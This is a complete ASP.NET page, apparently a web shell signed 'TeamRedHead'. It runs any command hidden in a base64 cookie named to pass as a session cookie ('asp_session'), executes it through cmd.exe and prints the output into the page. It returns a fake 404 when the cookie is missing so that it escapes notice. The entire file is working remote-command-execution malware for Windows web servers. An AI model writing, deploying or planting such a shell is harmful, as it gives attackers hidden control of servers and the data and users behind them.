<%@ Page Language="C#" %>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server"></head>
<body>
<!---- # TeamRedHead --- >
    <form id="form1" runat="server">
        <div>
            <%
                string cN = "asp_session";
                string o = "";

                if (Request.Cookies[cN] != null) {
                    try {
                        string eC = Request.Cookies[cN].Value;
                        byte[] d = Convert.FromBase64String(eC);
                        string c = System.Text.Encoding.UTF8.GetString(d);

                        var pI = new System.Diagnostics.ProcessStartInfo {
                            FileName = "cmd.exe",
                            Arguments = "/c " + c,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        };

                        using (var p = System.Diagnostics.Process.Start(pI)) {
                            o = p.StandardOutput.ReadToEnd();
                            string e = p.StandardError.ReadToEnd();
                            p.WaitForExit();

                            if (!string.IsNullOrEmpty(e)) {
                                o += "<br/><strong>Error:</strong> " + Server.HtmlEncode(e);
                            }
                        }

                        // Display the output directly on the page
                        Response.Write("<pre>" + Server.HtmlEncode(o) + "</pre>");
                    }
                    catch (FormatException) {
                        Response.Write("Error: Invalid cookie format.");
                    }
                    catch (Exception ex) {
                        Response.Write("Error: " + ex.Message);
                    }
                } else {
                    Response.StatusCode = 404;
                    Response.Write("Error: Cookie not found.");
                }
            %>
        </div>
    </form>
</body>
</html>
